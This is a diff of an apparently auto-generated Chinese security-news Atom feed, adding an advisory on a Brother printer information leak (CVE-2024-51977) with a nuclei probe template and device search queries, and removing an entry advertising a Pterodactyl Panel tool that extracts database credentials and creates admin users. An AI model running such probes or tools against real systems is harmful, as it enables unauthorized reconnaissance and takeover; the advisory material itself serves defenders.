@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-04T12:15:18.677Z</updated>
+  <updated>2025-07-04T12:45:19.777Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
+    <link href="http://example.com/2025/07/04/github_2318367792/"/>
+    <id>http://example.com/2025/07/04/github_2318367792/</id>
+    <published>2025-07-04T12:45:19.000Z</published>
+    <updated>2025-07-04T12:45:19.777Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Brother MFC-L9570CDW是一款多功能打印机，广泛应用于企业和家庭环境中，提供打印、扫描、复印等功能。该设备支持通过HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631）进行网络访问。</p><p>该漏洞属于信息泄露类型，技术根源在于设备未对访问&#x2F;etc&#x2F;mnt_info.csv路径的请求进行适当的身份验证。攻击者可以通过发送GET请求到该路径，无需任何认证即可获取设备的敏感信息，包括设备型号、固件版本、IP地址和序列号等。这些信息以逗号分隔值（CSV）表格的形式返回。</p><p>此漏洞的安全风险在于，攻击者可以利用泄露的信息进行进一步的攻击，如针对特定型号和固件版本的漏洞利用，或者进行网络钓鱼等社会工程学攻击。由于漏洞无需认证即可利用，且可以通过自动化工具批量扫描和利用，因此对受影响设备构成了中等程度的安全威胁。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> Brother MFC-L9570CDW</p><p><strong>搜索语法：</strong> html:”MFC-L9570CDW”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/248975b0dd50823c64c0718b4d250bc85788707a/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/248975b0dd50823c64c0718b4d250bc85788707a/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother MFC-L9570CDW <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK,iamnoooob,darses<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;MFC-L9570CDW&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>    <span class="hljs-params">zoomeye-query:</span><br>      <span class="hljs-operator">-</span> device<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span> <span class="hljs-operator">||</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,brother,mfc,printer,exposure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/etc/mnt_info.csv&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Model Name&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;IP Address&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 200&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;text/comma-separated-values&quot;</span>)&#x27;<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>V8 JavaScript Engine 缓冲区溢出漏洞</title>
@@ -515,33 +542,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pterodactyl Panel 信息泄露漏洞</title>
-    <link href="http://example.com/2025/07/04/github_239190805/"/>
-    <id>http://example.com/2025/07/04/github_239190805/</id>
-    <published>2025-07-04T04:15:19.000Z</published>
-    <updated>2025-07-04T04:15:19.335Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Pterodactyl Panel 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49132</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Pterodactyl Panel 是一款开源的游戏服务器管理面板，广泛用于游戏服务器托管和管理。它提供了一个基于Web的界面，允许用户轻松管理他们的游戏服务器。由于其易用性和功能丰富，Pterodactyl Panel 在游戏服务器社区中非常受欢迎。</p><p>该漏洞涉及敏感配置文件的暴露，特别是 <code>locale.json</code> 文件，以及从MySQL数据库中提取凭据的能力。攻击者可以利用这些信息泄露漏洞获取敏感数据，进一步可能导致未授权访问或其他恶意活动。技术根源在于不恰当的访问控制和敏感数据的不当处理，使得攻击者能够通过自动化工具发现并利用这些漏洞。</p><p>此漏洞的影响非常严重，因为它允许攻击者无需认证即可访问敏感信息，甚至可能创建具有管理员权限的用户，从而完全控制受影响的Pterodactyl Panel实例。这种漏洞的利用可以自动化进行，增加了其潜在的风险和广泛影响的可能性。因此，建议所有使用Pterodactyl Panel的用户立即检查并修复此漏洞，以防止潜在的安全威胁。</p><p><strong>产品厂商：</strong> Pterodactyl</p><p><strong>产品名称：</strong> Pterodactyl Panel</p><p><strong>来源：</strong> <a href="https://github.com/uxieltc/CVE-2025-49132">https://github.com/uxieltc/CVE-2025-49132</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>cve.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h1 align="center">🛡️ Pterodactyl Panel Vulnerability Checker & Exploit Tool</h1><p align="center">  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=24&pause=1500&color=00FF94&center=true&width=600&lines=Pentest+Tool+for+Pterodactyl;OSINT+%7C+Exploit+%7C+Automation" alt="Typing SVG" /></p><hr><h3 id="✨-Sobre"><a href="#✨-Sobre" class="headerlink" title="✨ Sobre"></a>✨ Sobre</h3><p>Um <strong>script Python</strong> que automatiza a descoberta e exploração de vulnerabilidades em painéis <strong>Pterodactyl</strong> mal configurados.</p><ul><li>🔍 Descobre exposição da configuração sensível (arquivo <code>locale.json</code>).  </li><li>🔑 Extrai credenciais do banco MySQL.  </li><li>👑 Cria usuário admin automaticamente com acesso total.  </li><li>☁️ Detecta e pula painéis protegidos por Cloudflare.</li></ul><hr><h3 id="⚙️-Tecnologias-e-Dependencias"><a href="#⚙️-Tecnologias-e-Dependencias" class="headerlink" title="⚙️ Tecnologias e Dependências"></a>⚙️ Tecnologias e Dependências</h3><p align="center">  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" />  <img src="https://img.shields.io/badge/Requests-5282B8?style=for-the-badge&logo=python-requests&logoColor=white" />  <img src="https://img.shields.io/badge/Colorama-FE7E02?style=for-the-badge&logo=python&logoColor=white" />  <img src="https://img.shields.io/badge/PyMySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white" />  <img src="https://img.shields.io/badge/Bcrypt-002D72?style=for-the-badge&logo=python&logoColor=white" /></p><hr><h3 id="🚀-Como-usar"><a href="#🚀-Como-usar" class="headerlink" title="🚀 Como usar"></a>🚀 Como usar</h3><ol><li><p>Crie um arquivo <code>list.txt</code> com URLs dos painéis alvo (um por linha).</p></li><li><p>Execute:</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 main.py list.txt<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Pterodactyl Panel 信息泄露漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
